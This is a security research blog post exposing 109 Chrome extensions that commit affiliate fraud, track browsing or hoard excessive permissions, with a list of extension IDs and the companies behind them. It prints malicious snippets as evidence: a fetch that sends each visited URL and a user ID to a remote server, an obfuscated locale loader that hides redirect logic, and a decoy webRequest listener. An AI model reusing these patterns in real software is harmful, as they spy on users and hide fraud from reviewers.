---
categories:
- security
- privacy
- add-ons
- google
date: 2023-06-08T14:10:27+0200
description: I discovered a cluster of at least 109 extensions in Chrome Web Store.
  A few are committing affiliate fraud or spying, most are simply hoarding overly
  wide privileges before abusing them.
lastmod: '2023-06-11 18:58:40'
title: Another cluster of potentially malicious Chrome extensions
---

We’ve already seen [Chrome extensions containing obfuscated malicious code](/2023/05/31/more-malicious-extensions-in-chrome-web-store/). We’ve also seen [PCVARK’s malicious ad blockers](/2023/06/05/introducing-pcvark-and-their-malicious-ad-blockers/). When looking for more PCVARK extensions, I stumbled upon an inconspicuous extension called “Translator - Select to Translate.” The only unusual thing about it were its reviews, lots of raving positive reviews mixed with usability complains. That, and the permissions: why does a translator extension need `webRequest` and `webRequestBlocking` permissions?

When I looked into this extension, I immediately discovered a strange code block. Supposedly, it was buggy locale processing. In reality, it turned out to be an obfuscated malicious logic meant to perform [affiliate fraud](https://www.investopedia.com/terms/a/affiliate-fraud.asp).

That extension wasn’t alone. I kept finding similar extensions until I had a list of 109 extensions, installed by more than 62 million users in total. While most of these extensions didn’t seem to contain malicious code (yet?), almost all of them requested excessive privileges under false pretenses. The names are often confusingly similar to established products. All of these extensions are clearly meant for dubious monetization.

{{< img src="pdf_viewer.png" width="600" alt="Two extension listed in Chrome Web Store, both called PDF Viewer. One hat watermark “Original” on top of it, bad rating and isn’t featured. The other has Google’s ”Featured” mark and good rating, the watermark says “Fake.”" />}}

If you aren’t interested in the technical details, you should probably go straight to the [list of affected extensions](#the-affected-extensions).

{{< toc >}}

## Malicious code

Altogether, I found malicious functionality in four browser extensions. There might be more, but I didn’t have time to thoroughly review more than a hundred browser extensions.

### Adblock all advertisments

No, I didn’t mistype the extension name. It is really named like that.

When opened it up, this turned out to be the most lazy ad blocker I’ve ever seen. Its entire ad blocking functionality essentially consists of 33 hardcoded rules and a tiny YouTube content script.

But wait, there is some functionality to update the rules! Except: why would someone put rule updates into a [tabs.onUpdated listener](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/onUpdated)? This is the code running whenever a tab finishes loading (simplified):

```js
let response = await fetch("https://smartadblocker.com/extension/rules/api", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    url: tab.url,
    userId: (await chrome.storage.sync.get("userId")).userId
  })
});
let json = await response.json();
for (let key in json)
  …
```

Supposedly, the response is a list of rules instructing the extension to remove elements on the page by their id, class or text. In reality this website always responds with “502 Bad Gateway.”

Now the website could of course be misconfigured. It’s more likely however that the website is working as intended: logging the incoming data (each address you navigate to along with your unique ID) and producing an error message to discourage anyone who comes looking.

It’s not like the developers behind these extensions don’t know how to produce a (moderately) better ad blocker. My list also features an extension called “Adblock Unlimited” which, despite similar code, manages to ship more than 10,000 rules. It also manages to complement these rules with dynamically downloaded anti-malware rules without leaking your visited addresses. Oh, and it has “anti-malware protection”: a content script that will detect exclusively test pages like `maliciouswebsitetest.com`.

### Translator - Select to Translate

My list features nine very similar, yet subtly different translator extensions. One of the differences in “Translator - Select to Translate” is a number of unusual functions, seemingly with the purpose of obfuscating the purpose of the code. For example, there is this gem:

```js
var base = e => e ? atob(e) : "parse";
```

This function is either used with a parameter to decode Base64, or without parameters to obfuscate a `JSON.parse()` call. When you start looking how these weird functions are used, it all leads to the `locales()` function:

```js
function locales(callback)
{
  chrome.runtime.getPackageDirectoryEntry(dirEntry =>
  {
    dirEntry.getDirectory("_locales", {}, dir =>
    {
      const reader = dir.createReader();
      const promises = [];
      reader.readEntries(entries =>
      {
        for (const entry of entries)
        {
          if (!entry.name.startsWith("."))
          {
            promises.push(new Promise((resolve, reject) =>
            {
              const name = entry.name;
              entry.getFile("../messages.json", {}, entry =>
              {
                entry.file(file =>
                {
                  const fileReader = new FileReader();
                  fileReader.onloadend = () => {
                    resolve({
                      k: name,
                      v: JSON.parse(fileReader.result)
                    });
                  };
                  fileReader.readAsText(file);
                });
              });
            }));
          }
        }
        callback(promises);
      });
    });
  });
}
```

On the first glance, this looks like a legitimate function to read the locale files. Except: there is a “bug,” it reads `"../messages.json"` instead of `"messages.json"`. So regardless of the locale, the file being read is `_locales/messages.json`.

The processing of the “locales” confirms that this is not a bug but rather intentional:

```js
combine(locales.sort()
    .filter(locale => locale.k.charCodeAt(0) % 5 != 0)
    .map(locale => locale.v.v.message + locale.v.s.message)
    .join("")
);
```

Yes, calculating the modulo of the first character in the locale name isn’t something you would normally find in any legitimate locale handling code. And neither would one concatenate the messages for locale strings named v and s.

When one looks at the `combine()` function, things only get weirder. If I got this correctly, the “locale data” is parsed by performing Base64-decoding twice and parsing the result as JSON then. And then you get code like the following (simplified here):

```js
var upd = data.upd;
var c = document[upd.cret](upd.crif);
```

From the context it’s obvious: this is calling `document.createElement()`. But it isn’t always possible to know for sure because the malicious `messages.json` file is missing from the extension. Presumably, the idea was publishing the code first and adding the malicious instructions later, in an update that wouldn’t raise suspicions.

With the instructions missing, understanding the code is tricky. Many calls can be guessed by their signature however. In particular, I can see an HTML element being created to initiate a web request. Additional data is then being extracted from the HTTP headers of the response. Presumably, the actual response data is something innocuous, meant to throw anyone off track who is monitoring network traffic.

After that at least two listeners are registered, presumably for [webRequest.onBeforeSendHeaders](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/webRequest/onHeadersReceived) and [tabs.onUpdated](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/onUpdated) events. While the former replaces/adds some HTTP header, the latter manipulates addresses and redirects some websites.

Even before I found the other extensions I guessed that this is about affiliate fraud: when you visit a shopping website, this code redirects you so that you get to the shop with the “right” affiliate ID. The publisher of the extension earns a commission for “referring” you to the shop then. Of course, the same code could just as well redirect your banking session to a phishing website.

### The Great Suspender and Flash Video Downloader

In case the name The Great Suspender sounds familiar and you are surprised to see it here: The Great Suspender used to be an open source extension, its code is still available on GitHub. Somebody took it and added some malicious code to it. Very similar code can be found in the Flash Video Downloader extension.

The code in question masquerades as a license check. The “license” is being downloaded from `https://www.greatsuspender.com/license_verification` and `https://www.flashvidownloader.com/license_verification` respectively. The first time this download happens, the response will be reassuring:

```json
{"settings":"{default:[true]}","license":"FREE","enable":"true","time":20946}
```

Looks fine? Well, the next download after a few hours will produce the real result:

{{< img src="arraySettings.png" width="600" alt="A long list of JSON objects, all containing numeric keys pr and p as well as an array r." />}}

Difficult to read? That’s probably because the `p` key of these objects is actually a position referring to a long encoded string. Let’s replace it by the strings it refers to:

{{< img src="arraySettings_decoded.png" width="600" alt="A long list of JSON objects, this time the p key contains strings like wayfair, target, nordvpn, creditcarma." />}}

So `p` is what this code looks for in a website address. If a match is found (and a number of other conditions met), you will be redirected to `https://prj1<PR>.com/<R>1` where `<PR>` is the digit in the `pr` key and `<R>` the second value in the array stored under the `r` key. All the redirects happen via the domains prj11[.]com, prj12[.]com, prj13[.]com, prj14[.]com, prj15[.]com.

There is also some special code for booking.com that will replace the `aid` parameter with a random affiliate out of a given list. If someone from Booking is reading and interested, the affiliate codes in question are: 1481387, 1491966, 1514055, 1575306, 1576925, 1582062, 230281, 230281, 230281, 7798654, 7798654, 7801354, 7805513, 7811018, 7811298, 7825986, 7825986.

And now that we know which domains are being used here, it’s trivial to find user complains. For example, [this Reddit thread](https://www.reddit.com/r/chrome/comments/o10vta/occasional_redirect_attempts_to_some_website_on/) identified The Great Suspender as the culprit two years ago. But one doesn’t have to go that far, the reviews for The Great Suspender in the Chrome Web Store are full with user complains. For example, this two years old review names the problem quite explicitly:

{{< img src="review1.png" width="703" alt="Sod Almighty on Aug 15, 2021: This extension is malware. It redirects my browser to prj11.com when I go to ebay." />}}

Or a newer one:

{{< img src="review2.png" width="853" alt="Cody Fitzpatrick on Jan 12, 2023: I used to love this extension, but it now seems contaminated with viruses / malware. This extension is DIRTY and tries to redirect you to affiliate tracking links when you go to sites like BestBuy, Newegg, and others. This is all so that the creator/author/publisher can make a COMMISSION on whatever you purchase.I would not have even noticed these redirects if I did not have a network-wide ad blocker in my home (PiHole). Very slimy. P.S. A few examples of domains I have seen it redirect to are: flexlinkspro.com, prj11.com, shara.li, and others that I did not care to write down. All of these domains are connected to affiliate marketing networks."/>}}

Yet the extension is still available in the Chrome Web Store.

## What are the other extensions up to?

Four outright malicious extensions leaves 105 extensions without obvious malicious functionality. What are these up to? Are they harmless?

I sincerely doubt that. These extensions are accumulating users with the purpose of monetizing them, likely via similarly dubious means.

### Policy violations

Typically, these extensions violate at least two Chrome Web Store policies. There is a [policy on spam and abuse](https://developer.chrome.com/docs/webstore/program-policies/spam-and-abuse/):

> We don't allow any developer, related developer accounts, or their affiliates to submit multiple extensions that provide duplicate experiences or functionality on the Chrome Web Store. Extensions should provide value to users through the creation of unique content or services.

Well, 13 almost identical video downloaders, 9 almost identical volume boosters, 9 almost identical translation extensions, 5 almost identical screen recorders are definitely not providing value. What they do is making it harder to people to find proper products that solve their problem.

There is also [Chrome Web Store policy on extension permissions](https://developer.chrome.com/docs/webstore/program-policies/permissions/):

> Request access to the narrowest permissions necessary to implement your Product's features or services. If more than one permission could be used to implement a feature, you must request those with the least access to data or functionality. Don't attempt to "future proof" your Product by requesting a permission that might benefit services or features that have not yet been implemented.

Almost all of these extensions do the exact opposite: request as many permissions as they can get away with.

### Access to all websites

Out of the 109 extensions listed, 102 request access to all websites, often paired with the `tabs` privilege. This privilege level is essential in order to conduct affiliate fraud: it allows detecting when you are about to visit a particular website.

These privileges also allow spying on you however, e.g. by compiling a browsing profile as we’ve seen with the ad blocking extension above. And they even allow injecting JavaScript code into the websites you visit.

Almost none of these extensions need this level of access for their functionality. In most cases, permissions for a single domain or the far less problematic [activeTab permission](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/permissions#activetab_permission) would have been sufficient. In fact, in quite a few extensions one can still see `https://*.youtube.com/` or `activeTab` in the list of permissions, only to be followed up by `<all_urls>` that the developers added later for reasons unrelated to functionality.

In particular, the five game extensions on my list don’t interact with websites at all. Yet all of them still request access to all websites.

### The webRequest/declarativeNetRequest permission

The [webRequest API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/webRequest) and its Manifest V3 pendant [declarativeNetRequest API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/declarativeNetRequest) are among the most powerful tools available to browser extensions. They allow extensions to watch all the web requests being performed by the browser. In combination with the `webRequestBlocking` permission, they also allow blocking any web requests or even replacing web server responses.

This is the kind of functionality required to run an ad blocker, but rarely anything else. So very few extensions should be requesting these permissions. Yet 66 out of 109 extensions (61%) on my list do. For reference: when looking at extensions with similar popularity in all of Chrome Web Store, I count only 35% of them requesting these permissions.

Presumably, Chrome Web Store performs automated checks to determine whether permissions are actually being used. So these extension contain code designed to fool these checks, e.g.:

```js
function handleResponseHeaders() {
  chrome.webRequest.onHeadersReceived.addListener(
    details => ({ responseHeaders: details.responseHeaders }),
    { urls: ["<all_urls>"] },
    [
      "blocking",
      "responseHeaders"
    ]
  );
}
```

This code slows down the browser by adding a listener, yet it doesn’t actually do anything. Instead of processing the headers, it merely returns them unchanged. Also popular: extracting some data, then never using it.

But this is actually the good code because some of these decoys are harmful. Quite a few will remove security headers like [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) or [X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options), others will mess with the `User-Agent` or `Set-Cookies` headers. The damage here might not be obvious but it’s there.

Tab Suspender extension took another approach: it incorporated some very rudimentary and error-prone tracker blocking functionality. It makes no sense in this extension, and most likely no user enables it. But it is used as justification for the `webRequest` permission.

Other than the ad blockers, only some of the downloader extensions seem to have `webRequest` functionality that is actually useful. Yet even those got additional dummy calls, just in case. The honorary mention goes to the Classic 2048 extension which includes a dummy `webRequest` call without even requesting the `webRequest` permission.

### Remote code execution

Normally, extensions are protected by the [default Content Security Policy](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_Security_Policy#default_content_security_policy) that allows only code contained within the extension to run. Malicious extensions often want to [circumvent this security mechanism](/2023/06/02/how-malicious-extensions-hide-running-arbitrary-code/) however, so that they can put the malicious code on some web server where it cannot be as easily inspected.

The extensions here take an easier route and relax the Content Security Policy restrictions instead. 32 out of 109 extensions (29%) allow `'unsafe-eval'` in their extension manifests. For comparison, only 9% of the similarly popular extensions in Chrome Web Store do this.

I haven’t found an extension that would actually use that loophole to download and run remote JavaScript code. But maybe I simply wasn’t thorough enough.

### User tracking

Almost all extensions on this list include a class which is sometimes named ExtStatTracker, more often however in a less conspicuous way. It regularly performs requests mildly masquerading as configuration downloads, except that the resulting “config” is never used.

Obviously, the purpose of these requests is transmitting data about the user: which extension, which version and, most importantly, which user. Each user is assigned a unique randomly generated identifier that is sent along with all requests.

There is also an “action” request performed when the extension starts up. Same data is being sent here as for the “config” download. The response might contain a `url` field, this page will open in a new tab then. No, I wouldn’t count on it being a welcome page.

Each extension uses its own domain as tracking endpoint. This domain often doesn’t match the extension name however, either because the extension name changed too often or because the developers simply didn’t care to use a matching domain name.

### Rudimentary functionality

Clearly, providing a great user experience was never the goal of these extensions. Their idea was rather making it seem like the extension is working with as little effort as possible. The better extensions appear to be based on some previous work, either open source code or an existing product that changed hands. Others have been built from scratch and barely function at all.

So it’s not surprising that the review sections are filling up with complains about functional issues. Still, most of these extensions have four or more stars on average. For once, many of them are begging for reviews. Some reviewers even complain that they are required to review before using the extension.

But there are also more classic fake reviews of course. These don’t even mention extension functionality but simply go on raving about how the extension changed their life.

Some reviews show that at least some of the extensions used to have an entirely different purpose. For example, not all the ChatGPT extensions are new. At least one of them used to be a translation extension which got repurposed.

## The companies developing these extensions

Most of these extensions are published anonymously. The developer’s email address is always some meaningless Gmail account. If there is any website content at all, it is largely meaningless as well. The privacy policy is some generic text not mentioning the developers and barely mentioning the extension at all – and then often enough with a wrong name.

So I was very surprised to discover that Moment Dashboard and Infinite Dashboard extensions list a developing company in their privacy policies. These extensions are monetizing themselves via the search field on the new tab page, so maybe the developers considered this business model legal enough to mention a name.

Either way, Moment Dashboard is developed by Kodice LLC based in Dubai, United Arab Emirates, and Infinite Dashboard is developed by Karbon Project LP based in London, UK. Yes, two different companies, despite these two extensions being close to identical.

This seeming contradiction is resolved when you look at the management of these companies. Turns out, the CEO of Karbon Project LP moved on to be the co-founder of Kodice LLC.

But that’s not all of it yet. The same person also founded Bigture, a company based in Warsaw, Poland. As it turns out, Bigture develops Dark Theme Tab extension which also made my list.

And that uTab Dashboard? Developed by another London-based startup: Appolo One LTD. Coincidentally, their founder happens to be a partner at Kodice LLC. And he is also the CTO who is recruiting developers for the Hong Kong based BroCode LTD. No, not in Hongkong but for the office in Kharkiv, Ukraine (before the war).

{{< img src="vacancy.png" width="597" alt="Screenshot of a Russian-language vacancy for a JavaScript Developer">}}
A vacancy at BroCode LTD from November 2020, looking for a JavaScript developer to “create new cool browser extensions and support/improve existing ones.”
{{< /img >}}

Another related extension: Clock New Tab. This one was developed by a Cyprus-based T.M.D.S. TECHNICAL MANAGEMENT LIMITED. Or maybe Bigture, depending on which Clock New Tab website you look at. Yes, the two websites are still online and have identical design. The two extensions are gone however, removed from Mozilla’s add-ons website in 2021.

{{< img src="clocknewtab.png" width="475" alt="Two identical texts describing Clock New Tab put next to each other. The text at the top says “This project is proudly developed by the dedicated team of a Bigture company.” The text at the bottom says “This project is proudly developed by the dedicated team of a T.M.D.S. TECHNICAL MANAGEMENT LIMITED.”" />}}

If all of this sounds like a money laundering scheme, then maybe that’s because it is one.

Either way, these companies describe themselves as specializing in advertising and affiliate marketing. Karbon Project existed since 2011 according to their website. While their incorporation papers show being founded in 2018 by two companies based on Seychelles, there is in fact evidence that it existed prior to that.

And they apparently already [made a name for themselves as makers of potentially unwanted software](https://www.2-viruses.com/remove-wowsearch-redirect). In addition to browser extensions, they also publish at least two web browsers. I checked the corresponding installers with VirusTotal and: surprise, they are being detected as trojans! [[1]](https://www.virustotal.com/gui/file/2eaa083a5985bd5d6f7ae72e2d22998e6d49d530ac4fd042c4f926ec6f7fa52a) [[2]](https://www.virustotal.com/gui/file/3cfbf5fb170e69d0882d5a372a3675c6217702cff7bc9e0b05fbd3d1bc8d8536)

Oh, and just because this hasn’t been enough fun already: these browser installers are signed by Rizzo Media LP which shares its address with Karbon Project LP in London. It has also been founded by the same two Seychelles companies.

I sent an email to Karbon Project LP, Kodice LLC and Bigture asking for comment on who developed all these browser extensions. So far neither company replied.

## The affected extensions

This list is certain to be incomplete. It’s mostly based on my sample of 1,670 popular Chrome extensions, not all of Chrome Web Store. User counts reflect the state for 2023-06-05.

Note that only the first four of these extensions are currently malicious from what I can tell. However, they were clearly created with the intention of abusing extension privileges at some point. Note also that the extension names change frequently and only the IDs can be used to reliably identify an extension.

While allowing execution of remote code (unsafe-eval) isn’t technically a permission, I listed it under permissions to simplify the presentation.

| Name | Weekly active users | Extension ID| Relevant permissions |
|----------------|-----------:|-------------|-----------|
| Adblock all advertisments - No Ads extension | 741,224 | gbdjcgalliefpinpmggefbloehmmknca | All websites<br>declarativeNetRequest<br>tabs |
| Translator - Select to Translate | 528,568 | eggeoellnjnnglaibpcmggjnjifeebpi | All websites<br>webRequest<br>notifications |
| Flash Video Downloader | 240,450 | ionpbgeeliajehajombdeflogfpgmmel | All websites<br>downloads<br>tabs<br>webRequest<br>unsafe-eval |
| The Great Suspender | 174,646 | jaekigmcljkkalnicnjoafgfjoefkpeg | All websites<br>history<br>tabs |
| Floating Video - Picture in Picture mode | 102,486 | aeilijiaejfdnbagnpannhdoaljpkbhe | All websites<br>webRequest |
| Sidebarr - chatgpt, bookmarks, apps and more | 162,384 | afdfpkhbdpioonfeknablodaejkklbdn | All websites<br>bookmarks<br>tabs<br>webRequest |
| Cute Cursors - Custom Cursor for Chrome™ | 1,022,641 | anflghppebdhjipndogapfagemgnlblh | All websites<br>tabs |
| Volume Booster | 4,536,673 | anmbbeeiaollmpadookgoakpfjkbidaf | All websites<br>tabs<br>tabCapture<br>webRequest |
| Translator Pro - Quick Translate | 486,062 | bebmphofpgkhclocdbgomhnjcpelbenh | All websites<br>tabs<br>webRequest<br>unsafe-eval |
| Screen Capture, Screenshot, Annotations | 568,357 | bmkgbgkneealfabgnjfeljaiegpginpl | All websites<br>webRequest<br>unsafe-eval |
| Sound Booster & Volume Control | 2,341,097 | ccjlpblmgkncnnimcmbanbnhbggdpkie | All websites<br>tabCapture<br>webRequest |
| Paint Online | 171,048 | cclhgechkjghfaoebihpklmllnnlnbdb | All websites<br>webRequest<br>unsafe-eval |
| Sidegram \| Web Client for Instagram™ | 282,701 | cfegchignldpfnjpodhcklmgleaoanhi | All websites<br>cookies<br>downloads<br>tabs<br>webRequest |
| Roblox with extras! - RoBox | 362,890 | cfllfglbkmnbkcibbjoghimalbileaic | All websites<br>notifications<br>webRequest |
| Video Downloader Plus | 785,815 | cjljdgfhkjbdbkcdkfojleidpldagmao | All websites<br>downloads<br>tabs<br>webRequest |
| Paint Tool for Chrome | 213,277 | coabfkgengacobjpmdlmmihhhfnhbjdm | All websites |
| Free privacy connection - VPN Guru | 529,711 | dcaffjpclkkjfacgfofgpjbmgjnjlpmh | All websites<br>proxy<br>webRequest |
| Screenshot Master and Screen Recorder | 717,617 | djekgpcemgcnfkjldcclcpcjhemofcib | All websites<br>desktopCapture<br>downloads<br>identity<br>tabCapture<br>tabs<br>unsafe-eval |
| Video Downloader Plus | 850,811 | dkbccihpiccbcheieabdbjikohfdfaje | All websites<br>downloads<br>tabs<br>webRequest |
| Night Shift Mode | 194,983 | dlpimjmonhbmamocpboifndnnakgknbf | All websites<br>tabs |
| Music Downloader - VKsaver | 278,761 | dmbjkidogjmmlejdmnecpmfapdmidfjg | All websites<br>webRequest<br>unsafe-eval |
| Web Color Picker - online color grabber | 346,145 | dneifdhdmnmmlobjbimlkcnhkbidmlek | All websites<br>notifications<br>webRequest |
| Free Paint Online - Draw on any website | 298,489 | doiiaejbgndnnnomcdhefcbfnbbjfbib | All websites<br>webRequest<br>unsafe-eval |
| Block Site: Site Blocker & Focus Mode | 450,216 | dpfofggmkhdbfcciajfdphofclabnogo | All websites<br>notifications<br>tabs |
| Classic 2048 online game | 255,101 | eabhkjojehdleajkbigffmpnaelncapp | All websites |
| Gmail Notifier - gmail notification tool | 128,201 | ealojglnbikknifbgleaceopepceakfn | All websites<br>notifications<br>tabs<br>webRequest |
| Audio Capture - Sound Recorder | 429,608 | ebdbcfomjliacpblnioignhfhjeajpch | All websites<br>downloads<br>tabCapture |
| Screenshot Tool - Screen Capture & Editor | 784,002 | edlifbnjlicfpckhgjhflgkeeibhhcii | All websites<br>unsafe-eval |
| New Tab with chatgpt for Chrome | 163,289 | ehmneimbopigfgchjglgngamiccjkijh | All websites<br>tabs |
| New Tab for Google Workspace™ | 177,701 | ehpgcagmhpndkmglombjndkdmggkgnge | bookmarks<br>history<br>management<br>topSites |
| paint | 230,984 | ejllkedmklophclpgonojjkaliafeilj | All websites<br>tabs<br>webRequest<br>unsafe-eval |
| Online messengers in All-in-One chat | 284,493 | ekjogkoigkhbgdgpolejnjfmhdcgaoof | All websites<br>tabs<br>webRequest |
| Video Downloader Ultimate | 654,295 | elpdbicokgbedckgblmbhoamophfbchi | All websites<br>downloads<br>webRequest<br>unsafe-eval |
| Web Paint | 499,229 | emeokgokialpjadjaoeiplmnkjoaegng | All websites<br>webRequest<br>unsafe-eval |
| Color picker tool - geco | 821,616 | eokjikchkppnkdipbiggnmlkahcdkikp | All websites<br>notifications<br>webRequest |
| VPN Unlimited - Best VPN by unblock | 302,077 | epeigjgefhajkiiallmfblgglmdbhfab | All websites<br>proxy<br>webRequest |
| Flash Player Enabler | 314,400 | eplfglplnlljjpeiccbgnijecmkeimed | All websites<br>notifications |
| ChatGPT Plus for Google | 660,571 | fbbjijdngocdplimineplmdllhjkaece | All websites<br>webRequest |
| Volume Booster - Sound Master pro | 1,056,902 | fbjhgeaafhlbjiejehpjdnghinlcceak | All websites<br>tabCapture<br>webRequest |
| Video Downloader for Chrome | 432,088 | fedchalbmgfhdobblebblldiblbmpgdj | All websites<br>downloads<br>webRequest<br>unsafe-eval |
| InSaverify \| Web for Instagram™ | 723,983 | fobaamfiblkoobhjpiigemmdegbmpohd | All websites<br>downloads<br>webRequest |
| Video Speed Controller - video manager | 571,724 | gaiceihehajjahakcglkhmdbbdclbnlf | *None* |
| Sound Equalizer with Volume Booster | 160,716 | gceehiicnbpehbbdaloolaanlnddailm | All websites<br>tabCapture<br>unsafe-eval |
| How to Take Screenshot | 718,442 | ggacghlcchiiejclfdajbpkbjfgjhfol | All websites<br>notifications |
| Dark Theme - Night Shift Mode | 741,084 | gjjbmfigjpgnehjioicaalopaikcnheo | All websites<br>tabs |
| Quick Translate: Reading & writing translator | 145,527 | gpdfpljioapjogbnlpmganakfjcemifk | All websites<br>declarativeNetRequest<br>tabs |
| HD Video Downloader | 783,475 | hjlekdknhjogancdagnndeenmobeofgm | All websites<br>downloads<br>webRequest |
| Picture in Picture - Floating Player | 790,847 | hlbdhflagoegglpdminhlpenkdgloabe | All websites<br>webRequest |
| Translator - Web translate, Dictionary | 143,032 | hnfabcchmopgohnhkcojhocneefbnffg | All websites<br>unsafe-eval |
| 2048 Game | 579,610 | iabflonngmpkalkpbjonemaamlgdghea | All websites<br>webRequest |
| Select to translate - Translator, Dictionary | 834,660 | ibppednjgooiepmkgdcoppnmbhmieefh | All websites<br>tabs<br>webRequest |
| Simple Translate: Select to Translate | 148,542 | icchadngbpkcegnabnabhkjkfkfflmpj | All websites<br>declarativeNetRequest<br>tabs |
| Quick Translator - Translate, Dictionary | 289,479 | ielooaepfhfcnmihgnabkldnpddnnldl | All websites<br>webRequest |
| BlockSite: Free Site Blocker & Focus Mode | 447,353 | ifdepgnnjpnbkcgempionjablajancjc | All websites<br>notifications<br>tabs<br>unsafe-eval |
| Scrnli Screen Recorder & Screen Capture App | 1,391,249 | ijejnggjjphlenbhmjhhgcdpehhacaal | All websites<br>desktopCapture<br>tabCapture<br>unsafe-eval |
| Web Paint Tool - draw online | 540,374 | iklgljbighkgbjoecoddejooldolenbj | All websites<br>webRequest<br>unsafe-eval |
| Free Screen Recorder for Chrome | 1,397,721 | imopknpgdihifjkjpmjaagcagkefddnb | All websites<br>desktopCapture<br>downloads<br>identity<br>tabCapture<br>unsafe-eval |
| Sound Booster & Pro equalizer- Audio Master | 908,736 | jchmabokofdoabocpiicjljelmackhho | All websites<br>tabCapture<br>tabs<br>webRequest |
| PDF Viewer | 159,253 | jdlkkmamiaikhfampledjnhhkbeifokk | All websites<br>webRequest |
| Video Downloader Online | 659,516 | jglemppahimembneahjbkhjknnefeeio | All websites<br>downloads<br>tabs<br>webRequest |
| Adblock Unlimited - ad blocker | 633,692 | jiaopkfkampgnnkckajcbdgannoipcne | All websites<br>declarativeNetRequest |
| Audio Capture - Volume Recorder | 282,691 | jjgnkfncaadmaobenjjpmngdpgalemho | All websites<br>downloads<br>tabCapture<br>webRequest |
| ChatGPT for Search - Support GPT-4 | 709,522 | jlbpahgopcmomkgegpbmopfodolajhbl | *None* |
| Adblock for YouTube™ | 477,901 | jpefmbpcbebpjpmelobfakahfdcgcmkl | All websites<br>tabs<br>unsafe-eval |
| Chatgpt lite - OpenAI | 452,660 | khdnaopfklkdcloiinccnaflffmfcioa | All websites<br>webRequest |
| Doodle games | 172,823 | kjgkmceledmpdnmgmppiekdbnamccdjp | All websites<br>webRequest |
| Tab Suspender | 144,708| laameccjpleogmfhilmffpdbiibgbekf | All websites<br>tabs<br>webRequest<br>unsafe-eval |
| Adblock for Youtube - ad blocker tool | 504,747 | lagdcjmbchphhndlbpfajelapcodekll | All websites<br>tabs |
| Image Downloader - Save photos and pictures | 1,108,637 | lbohagbplppjcpllnhdichjldhfgkicb | All websites<br>downloads<br>webRequest |
| Video Downloader Wise | 334,204 | ledkggjjapdgojgihnaploncccgiadhg | All websites<br>cookies<br>downloads<br>tabs<br>webRequest<br>unsafe-eval |
| Moment - #1 Personal Dashboard for Chrome | 145,695 | lgecddhfcfhlmllljooldkbbijdcnlpe | topSites<br>unsafe-eval |
| Skip Ad - Ad Block & Auto Ad Skip on YouTube | 737,164 | lkahpjghmdhpiojknppmlenngmpkkfma | All websites<br>webRequest |
| Wowsearch | 9,871 | lkciiknpgglgbbcgcpbpobjabglmpkle | webRequest<br>unsafe-eval |
| Flash Player for Web | 838,775 | lkhhagecaghfakddbncibijbjmgfhfdm | All websites<br>notifications |
| Web client for Instagram™ | 147,377 | lknpbgnookklokdjomiildnlalffjmma | All websites<br>downloads<br>webRequest |
| Web translator, dictionary - simple translate | 797,018 | lojpdfjjionbhgplcangflkalmiadhfi | All websites<br>webRequest<br>unsafe-eval |
| Video downloader - download any video for free | 451,102 | mdkiofbiinbmlblcfhfjgmclhdfikkpm | All websites<br>downloads<br>webRequest<br>unsafe-eval |
| Infinite Dashboard - New Tab like no other |233,688 | meffljleomgifbbcffejnmhjagncfpbd | All websites<br>tabs<br>topSites<br>unsafe-eval |
| ChatGPT Assistant for Chrome \| SidebarGPT | 301,246 | mejjgaogggabifjfjdbnobinfibaamla | All websites<br>tabs |
| Good Video Downloader | 394,903 | mhpcabliilgadobjpkameggapnpeppdg | All websites<br>downloads<br>webRequest<br>unsafe-eval |
| Video Downloader Unlimited | 716,091 | mkjjckchdfhjbpckippbnipkdnlidbeb | All websites<br>downloads<br>webRequest |
| Video Downloader by 1qvid | 986,983 | mldaiedoebimcgkokmknonjefkionldi | All websites<br>downloads<br>webRequest |
| Chatgpt friend | 565,345 | mlkjjjmhjijlmafgjlpkiobpdocdbncj | webRequest |
| Picture-in-Picture - floating video | 794,535 | mndiaaeaiclnmjcnacogaacoejchdclp | All websites<br>unsafe-eval |
| Translator uLanguage - Translate, Dictionary | 709,192 | mnlohknjofogcljbcknkakphddjpijak | All websites<br>tabs |
| VPN Surf - Fast VPN by unblock | 443,066 | nhnfcgpcbfclhfafjlooihdfghaeinfc | All websites<br>proxy<br>webRequest |
| ChatGPT for Chrome - search GPT | 1,057,279 | ninecedhhpccjifamhafbdelibdjibgd | *None* |
| Sound Booster - increase volume up | 752,471 | nmigaijibiabddkkmjhlehchpmgbokfj | All websites<br>tabCapture<br>tabs |
| Text Reader (Text to Speech) TTS by Read me | 312,121 | npdkkcjlmhcnnaoobfdjndibfkkhhdfn | All websites<br>webRequest |
| uTab - Unlimited Custom Dashboard | 234,918 | npmjjkphdlmbeidbdbfefgedondknlaf | All websites<br>bookmarks |
| Flash Player Update | 497,248 | oakbcaafbicdddpdlhbchhpblmhefngh | All websites<br>unsafe-eval |
| Web paint tool by Painty | 432,129 | obdhcplpbliifflekgclobogbdliddjd | All websites<br>tabs<br>topSites |
| Night Shift | 213,620 | ocginjipilabheemhfbedijlhajbcabh | All websites |
| Editing for Docs, Sheets & Slides | 167,677 | oepjogknopbbibcjcojmedaepolkghpb | All websites<br>webRequest<br>unsafe-eval |
| Accept all cookies | 292,192 | ofpnikijgfhlmmjlpkfaifhhdonchhoi | All websites<br>webRequest |
| VolumeUp - Sound booster | 731,585 | ogadflejmplcdhcldlloonbiekhnlopp | All websites<br>tabCapture<br>tabs |
| The cleaner - delete cookies and cache | 133,968 | ogfjgagnmkiigilnoiabkbbajinanlbn | All websites<br>cookies<br>tabs<br>webRequest |
| Screenshot & Screen Recorder | 288,528 | okkffdhbfplmbjblhgapnchjinanmnij | All websites<br>downloads<br>tabCapture<br>tabs<br>webRequest |
| All Doodle games | 134,820 | oodkhhminilgphkdofffddlgopkgbgpm | All websites |
